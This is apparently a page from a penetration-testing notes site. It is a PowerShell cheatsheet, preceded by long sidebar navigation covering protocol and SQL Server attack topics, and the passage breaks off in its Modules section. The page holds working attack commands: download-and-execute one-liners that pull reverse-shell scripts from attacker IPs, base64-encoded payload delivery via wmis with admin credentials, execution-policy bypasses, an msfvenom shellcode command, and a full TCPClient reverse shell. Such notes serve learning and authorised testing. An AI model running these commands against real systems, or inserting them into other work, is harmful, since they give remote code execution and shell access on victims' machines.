    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/LDAP-389/" title="LDAP 389" class="md-nav__link">
      LDAP 389
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/Memcache/" title="Memcache" class="md-nav__link">
      Memcache
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/Modbus-502/" title="Modbus 502" class="md-nav__link">
      Modbus 502
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/MySQL-3306/" title="MySQL 3306" class="md-nav__link">
      MySQL 3306
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/NFS-2049/" title="NFS 2049" class="md-nav__link">
      NFS 2049
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/NTP-123/" title="NTP 123" class="md-nav__link">
      NTP 123
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/Oracle-1521/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/POP3-110/" title="POP3 110" class="md-nav__link">
      POP3 110
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/PPTP-L2TP-VPN-500,1723/" title="PPTP L2TP VPN 500,1723" class="md-nav__link">
      PPTP L2TP VPN 500,1723
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/Portmapper-111/" title="Portmapper 111" class="md-nav__link">
      Portmapper 111
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/RDP-3389/" title="RDP 3389" class="md-nav__link">
      RDP 3389
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/RPC-135,445/" title="RPC 135,445" class="md-nav__link">
      RPC 135,445
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/SIP-5060/" title="SIP 5060" class="md-nav__link">
      SIP 5060
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/" title="SMB Samba NetBIOS 135 139,445" class="md-nav__link">
      SMB Samba NetBIOS 135 139,445
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/SMTP-25/" title="SMTP 25" class="md-nav__link">
      SMTP 25
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/SNMP-161/" title="SNMP 161" class="md-nav__link">
      SNMP 161
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/SQL-Server-1433,1434/" title="SQL Server 1433,1434" class="md-nav__link">
      SQL Server 1433,1434
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/SSH-22/" title="SSH 22" class="md-nav__link">
      SSH 22
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/SquidProxy-3128/" title="SquidProxy 3128" class="md-nav__link">
      SquidProxy 3128
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/TFTP-69/" title="TFTP 69" class="md-nav__link">
      TFTP 69
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/Telnet-23/" title="Telnet 23" class="md-nav__link">
      Telnet 23
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/Tor-9001,9030/" title="Tor 9001,9030" class="md-nav__link">
      Tor 9001,9030
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/VNC-5900/" title="VNC 5900" class="md-nav__link">
      VNC 5900
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/WebDev/" title="WebDev" class="md-nav__link">
      WebDev
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/WinRM-5985,5986/" title="WinRM 5985,5986" class="md-nav__link">
      WinRM 5985,5986
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/X11-6000/" title="X11 6000" class="md-nav__link">
      X11 6000
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/rlogin-513/" title="Rlogin 513" class="md-nav__link">
      Rlogin 513
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/z-References/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-33" type="checkbox" id="nav-33">
    
    <label class="md-nav__link" for="nav-33">
      Sqlserver
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-33">
        Sqlserver
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../sqlserver/3-command-execution/" title="3 command execution" class="md-nav__link">
      3 command execution
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../sqlserver/4-privilage-escalation/" title="04. Privilege Escalation" class="md-nav__link">
      04. Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../sqlserver/5-lateral-movement/" title="05. Lateral Movement" class="md-nav__link">
      05. Lateral Movement
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../sqlserver/6-persistence/" title="06. Persistence" class="md-nav__link">
      06. Persistence
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../sqlserver/9-defence/" title="09. Defence" class="md-nav__link">
      09. Defence
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../sqlserver/9-pending-references/" title="10. New References" class="md-nav__link">
      10. New References
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../sqlserver/important-locations/" title="Imprtant Locations" class="md-nav__link">
      Imprtant Locations
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../sqlserver/sqli/" title="SQL Injection" class="md-nav__link">
      SQL Injection
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../sqlserver/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../sqlserver/z-References/" title="z References" class="md-nav__link">
      z References
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#versions" class="md-nav__link">
    Versions
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#help-system" class="md-nav__link">
    Help System
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#basic-constructs" class="md-nav__link">
    Basic Constructs
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#list-all-cmdlets" class="md-nav__link">
    List all Cmdlets
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aliases" class="md-nav__link">
    Aliases
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#check-environment" class="md-nav__link">
    Check Environment
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#download-files" class="md-nav__link">
    Download Files
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#base64-encoded-payload-delivery" class="md-nav__link">
    Base64 encoded payload delivery
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#execution-policy" class="md-nav__link">
    Execution Policy
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#revserse-shell" class="md-nav__link">
    Revserse Shell
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#modules" class="md-nav__link">
    Modules
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#remote-script-execution" class="md-nav__link">
    Remote Script execution
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hnew-object-comobject-msxm12xmlhttphopenget-http1921682301evilpsi1-falsehsendiex-h-responsetext" class="md-nav__link">
    $h=New-Object -ComObject Msxm12.XMLHTTP;$h.open(&#39;GET&#39;, &#39;http://192.168.230.1/evil.psi1&#39; ,$false);$h.send();iex $h. responseText
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#command-history-psreadline" class="md-nav__link">
    Command History (PSReadline)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#powershell-remoting" class="md-nav__link">
    Powershell Remoting
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#wsman-webservicesmanagement-protocol-winrm" class="md-nav__link">
    WSMAN (WebServicesManagement) Protocol (WinRM)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wsman-vs-powershell-remoting-vs-wmi" class="md-nav__link">
    WSMAN vs PowerShell Remoting vs WMI
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#one-to-one" class="md-nav__link">
    One to One
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#useful-cmdlets" class="md-nav__link">
    Useful cmdlets
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#one-to-many-fan-out-remoting" class="md-nav__link">
    One to Many (Fan-out Remoting)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#load-powerup" class="md-nav__link">
    Load PowerUp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory" class="md-nav__link">
    Active Directory
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#system-information" class="md-nav__link">
    System Information
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#jobs" class="md-nav__link">
    Jobs
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#net" class="md-nav__link">
    .Net
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploring-assemblies" class="md-nav__link">
    Exploring Assemblies
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#assemblyname" class="md-nav__link">
    AssemblyName
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#typedefinition" class="md-nav__link">
    TypeDefinition
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#memberdefinition-dll-import" class="md-nav__link">
    MemberDefinition - DLL Import
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wmi" class="md-nav__link">
    WMI
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#com-objects" class="md-nav__link">
    COM Objects
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                <h1 id="cheatsheet">Cheatsheet<a class="headerlink" href="#cheatsheet" title="Permanent link">&para;</a></h1>
<p>Using command line (why not run direcrly???)
<div class="codehilite"><pre><span></span><span class="n">echo</span> <span class="n">IEX</span><span class="p">(</span><span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.17:8000/Sherlock.ps1&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="n">PowerShell</span> <span class="o">-</span><span class="n">Noprofile</span> <span class="o">-</span>
</pre></div></p>
<h2 id="versions">Versions<a class="headerlink" href="#versions" title="Permanent link">&para;</a></h2>
<ul>
<li>v1: November 2006 - Windows XP SP2, Windows Server 2003 SP1 and Windows Vista</li>
<li>v2: Windows 7 and Windows Server 2008 R2 (Standalone for: Windows XP SP3, Windows Server 2003 SP2, and Windows Vista SP1)</li>
<li>v3: Windows 8 (Can be installed on: Windows 7 SP1, for Windows Server 2008 SP1, and for Windows Server 2008 R2 SP1) (no XP support)</li>
<li>v4: Windows 8.1 (Can be installed on:  Windows 7 SP1, for Windows Server 2008 SP1, and for Windows Server 2008 R2 SP1)</li>
<li>v5:<ul>
<li>Part of Windows Management Framework (WMF) 5.0.</li>
<li>February 24, 2016.</li>
<li>Features OneGet PowerShell cmdlets to support Chocolatey's repository-based apps.</li>
<li>Ability to manage layer 2 network switches</li>
<li>Windows 10 Anniversary Update</li>
<li>Available for Windows 7, Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, and Windows Server 2012 R2</li>
</ul>
</li>
<li>v6: PowerShell Core on 18 August 2016</li>
</ul>
<div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="k">Host</span> <span class="o">|</span> <span class="k">Select</span><span class="o">-</span><span class="k">Object</span> <span class="k">Version</span>
<span class="err">$</span><span class="n">PSVersionTable</span>
</pre></div>

<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://pinvoke.net">https://pinvoke.net</a> - Allowing developers to find, edit and add <code class="codehilite"><span class="n">PInvoke</span></code><a href="https://pinvoke.net/#definePinvoke">*</a> signatures, user-defined types, and any other information related to calling Win32 and other unmanaged APIs from managed code (written in languages such as C# or VB.NET).</li>
<li>An A-Z Index of Windows <strong>PowerShell</strong> commands: <a href="https://ss64.com/ps/">https://ss64.com/ps/</a></li>
<li>Windows <strong>PowerShell</strong> command line syntax: <a href="https://ss64.com/ps/syntax.html">https://ss64.com/ps/syntax.html</a></li>
</ul>
<h2 id="help-system">Help System<a class="headerlink" href="#help-system" title="Permanent link">&para;</a></h2>
<ul>
<li>Versin information: <code class="codehilite"><span class="err">$</span><span class="n">PSVersionTable</span></code></li>
</ul>
<ul>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Help</span> <span class="k">Get</span><span class="o">-</span><span class="n">Process</span></code></li>
<li><code class="codehilite"><span class="n">help</span> <span class="k">Get</span><span class="o">-</span><span class="n">Process</span></code></li>
<li><code class="codehilite"><span class="k">Update</span><span class="o">-</span><span class="n">Help</span></code></li>
</ul>
<ul>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Help</span> <span class="n">remoting</span></code></li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Help</span> <span class="n">about_</span><span class="o">*</span><span class="n">remot</span><span class="o">*</span></code></li>
</ul>
<p>64 bit
<div class="codehilite"><pre><span></span><span class="c">%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe &quot;IEX(New-Object Net.Webclient).DownloadString(&#39;http://10.10.14.17/Invoke-PowerShellTcp.ps1&#39;)&quot;</span>
</pre></div>
32 bit
<div class="codehilite"><pre><span></span><span class="k">START</span> <span class="o">/</span><span class="k">MIN</span> <span class="o">/</span><span class="n">LOW</span> <span class="n">CMD</span> <span class="o">/</span><span class="k">C</span> <span class="o">%</span><span class="n">SystemRoot</span><span class="o">%</span><span class="err">\</span><span class="n">system32</span><span class="err">\</span><span class="n">WindowsPowerShell</span><span class="err">\</span><span class="n">v1</span><span class="p">.</span><span class="mi">0</span><span class="err">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="ss">&quot;IEX(New-Object Net.Webclient).DownloadString(&#39;http://10.11.0.50/shells/Invoke-PowerShellTcp.ps1&#39;)&quot;</span>
</pre></div></p>
<h2 id="basic-constructs">Basic Constructs<a class="headerlink" href="#basic-constructs" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">Cmdlets</span>
<span class="k">Function</span>
</pre></div>

<h3 id="list-all-cmdlets">List all Cmdlets<a class="headerlink" href="#list-all-cmdlets" title="Permanent link">&para;</a></h3>
<p><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">CommandTyle</span> <span class="n">Cmdlet</span></code></p>
<h2 id="aliases">Aliases<a class="headerlink" href="#aliases" title="Permanent link">&para;</a></h2>
<p><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="k">Alias</span> <span class="o">-</span><span class="n">Name</span> <span class="n">ps</span></code>
<code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="k">Alias</span> <span class="o">-</span><span class="n">Definition</span> <span class="k">Get</span><span class="o">-</span><span class="n">Process</span></code></p>
<h2 id="check-environment">Check Environment<a class="headerlink" href="#check-environment" title="Permanent link">&para;</a></h2>
<ul>
<li><code class="codehilite"><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">WIndows</span><span class="err">\</span><span class="n">Syswow64</span><span class="err">\</span><span class="n">Windowspowershell</span><span class="err">\</span><span class="n">v1</span><span class="p">.</span><span class="mi">0</span><span class="err">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span></code><ul>
<li><code class="codehilite"><span class="n">PSModulePath</span></code></li>
</ul>
</li>
<li>Version info: <code class="codehilite"><span class="n">powershell</span> <span class="o">-</span><span class="n">v</span> <span class="mi">2</span><span class="p">.</span><span class="mi">0</span> <span class="o">-</span><span class="k">c</span> <span class="err">$</span><span class="n">psversiontable</span></code></li>
<li>Language mode: <code class="codehilite"><span class="err">$</span><span class="k">host</span><span class="p">.</span><span class="n">runspace</span><span class="p">.</span><span class="n">languagemode</span></code></li>
<li>Check if AppLocker is enabled: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">AppLockerPolicy</span> <span class="o">-</span><span class="k">Local</span></code></li>
<li>Powershell Version: <code class="codehilite"><span class="p">(</span><span class="k">Get</span><span class="o">-</span><span class="k">Host</span><span class="p">).</span><span class="k">Version</span></code></li>
<li>64bit version: <code class="codehilite"><span class="c">%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe</span></code></li>
</ul>
<h2 id="download-files">Download Files<a class="headerlink" href="#download-files" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">powershell</span> <span class="nb">wget </span><span class="s2">&quot;http://example.com/abc.txt&quot;</span> <span class="n">-outfile</span> <span class="s2">&quot;abc.txt&quot;</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&quot;http://192.168.0.17/PS_TCP4.ps1&quot;</span> <span class="n">-OutFile</span> <span class="nv">$fullpath</span><span class="p">;</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">powershell</span> <span class="o">-</span><span class="k">c</span> <span class="ss">&quot;Invoke-WebRequest -Uri http://10.10.15.150/41020.exe -OutFile C:\Users\kostas\Desktop\41020.exe&quot;</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">echo</span> <span class="err">$</span><span class="n">webclient</span> <span class="o">=</span> <span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="k">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span> <span class="o">&gt;</span><span class="n">wget</span><span class="p">.</span><span class="n">ps1</span>
<span class="n">echo</span> <span class="err">$</span><span class="n">url</span> <span class="o">=</span> <span class="ss">&quot;http://10.10.10.10/example.exe&quot;</span> <span class="o">&gt;&gt;</span><span class="n">wget</span><span class="p">.</span><span class="n">ps1</span>
<span class="n">echo</span> <span class="err">$</span><span class="n">file</span> <span class="o">=</span> <span class="ss">&quot;example.exe&quot;</span> <span class="o">&gt;&gt;</span><span class="n">wget</span><span class="p">.</span><span class="n">ps1</span>
<span class="n">echo</span> <span class="err">$</span><span class="n">webclient</span><span class="p">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="err">$</span><span class="n">url</span><span class="p">,</span><span class="err">$</span><span class="n">file</span><span class="p">)</span> <span class="o">&gt;&gt;</span><span class="n">wget</span><span class="p">.</span><span class="n">ps1</span>


<span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">ExecutionPolicy</span> <span class="n">Bypass</span> <span class="o">-</span><span class="n">NoLogo</span> <span class="o">-</span><span class="n">NonInterative</span> <span class="o">-</span><span class="n">NoProfile</span> <span class="o">-</span><span class="n">File</span> <span class="n">wget</span><span class="p">.</span><span class="n">ps1</span>
</pre></div>

<h2 id="base64-encoded-payload-delivery">Base64 encoded payload delivery<a class="headerlink" href="#base64-encoded-payload-delivery" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">echo</span> <span class="ss">&quot;iex (New-Object Net.WebClient).DownloadString(&#39;http://172.16.67.128:80/6WcepYO&#39;)&quot;</span> <span class="o">|</span> <span class="n">iconv</span> <span class="c1">--to-code UTF-16LE | base64 -w 0</span>
<span class="n">kaliwmis</span><span class="o">-</span><span class="mi">32</span> <span class="o">-</span><span class="n">U</span> <span class="n">administrator</span><span class="o">%</span><span class="n">badpassword</span> <span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span> <span class="ss">&quot;cmd.exe /c  powershell.exe -nop -enc &lt;base64-value&gt;&quot;</span>
</pre></div>

<h2 id="execution-policy">Execution Policy<a class="headerlink" href="#execution-policy" title="Permanent link">&para;</a></h2>
<p>powershell.exe -exec Bypass</p>
<ul>
<li>Not a security feature</li>
<li>Used to avoid accidental script execution</li>
<li>Can be bypass with:<ul>
<li><code class="codehilite"><span class="n">powershell</span> <span class="o">-</span><span class="n">ExecutionPolicy</span> <span class="n">bypass</span> <span class="p">.</span><span class="err">\</span><span class="n">example</span><span class="p">.</span><span class="n">ps1</span></code></li>
<li><code class="codehilite"><span class="n">powershell</span> <span class="o">-</span><span class="k">c</span> <span class="o">&lt;</span><span class="n">cmd</span><span class="o">&gt;</span></code></li>
<li><code class="codehilite"><span class="n">powershell</span> <span class="o">-</span><span class="n">EncodedCommand</span> <span class="o">&lt;</span><span class="n">cmd</span><span class="o">&gt;</span></code></li>
<li><code class="codehilite"><span class="n">powershell</span> <span class="o">-</span><span class="n">enc</span> <span class="o">&lt;</span><span class="n">cmd</span><span class="o">&gt;</span></code></li>
<li><code class="codehilite"><span class="err">$</span><span class="n">env</span><span class="p">:</span><span class="n">PSExecutionPolicyPreference</span><span class="o">=</span><span class="ss">&quot;bypass&quot;</span></code></li>
</ul>
</li>
</ul>
<blockquote>
<ul>
<li>Ref <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6</a></li>
</ul>
<ul>
<li>15 ways to bypass PowerShell execution policy: <a href="https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy">https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy</a></li>
</ul>
</blockquote>
<h2 id="revserse-shell">Revserse Shell<a class="headerlink" href="#revserse-shell" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="err">“</span><span class="n">powershell</span><span class="err">”</span> <span class="n">-argumentlist</span> <span class="err">“</span><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">downloadString</span><span class="p">(</span><span class="err">‘</span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">30</span><span class="p">/</span><span class="n">adminshell</span><span class="p">.</span><span class="n">ps1</span><span class="err">’</span><span class="p">)</span><span class="err">”</span> <span class="n">-Credential</span> <span class="nv">$cred</span>

<span class="n">msfvenom</span> <span class="n">-a</span> <span class="n">x86</span> <span class="p">-</span><span class="n">-platform</span> <span class="n">Windows</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">exec</span> <span class="n">CMD</span><span class="p">=</span><span class="s2">&quot;powershell -c iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.159/Invoke-PowerShellTcp-8082.ps1&#39;)&quot;</span> <span class="n">-e</span> <span class="n">x86</span><span class="p">/</span><span class="n">unicode_mixed</span> <span class="n">-b</span> <span class="s1">&#39;\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#39;</span> <span class="n">BufferRegister</span><span class="p">=</span><span class="n">EAX</span> <span class="o">-f</span> <span class="n">python</span> <span class="p">&gt;</span> <span class="n">shellcode</span>
</pre></div>

<p><a href="http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html">http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html</a>
<div class="codehilite"><pre><span></span><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s2">&quot;10.10.10.10&quot;</span><span class="p">,</span><span class="n">80</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s2">&quot;PS &quot;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s2">&quot;&gt; &quot;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
</pre></div></p>
<h2 id="modules">Modules<a class="headerlink" href="#modules" title="Permanent link">&para;</a></h2>
<p><code class="codehilite"><span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">&lt;</span><span class="n">path_to_module</span><span class="o">&gt;</span> <span class="o">-</span><span class="k">verbose</span></code></p>
<ul>
<li>List all available modules: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Module</span> <span class="o">-</span><span class="n">ListAvailable</span> <span class="o">-</span><span class="k">All</span></code><ul>
<li>List all modules available in: <code class="codehilite"><span class="err">$</span><span class="n">env</span><span class="p">:</span><span class="n">PSModulePath</span></code></li>
</ul>
</li>
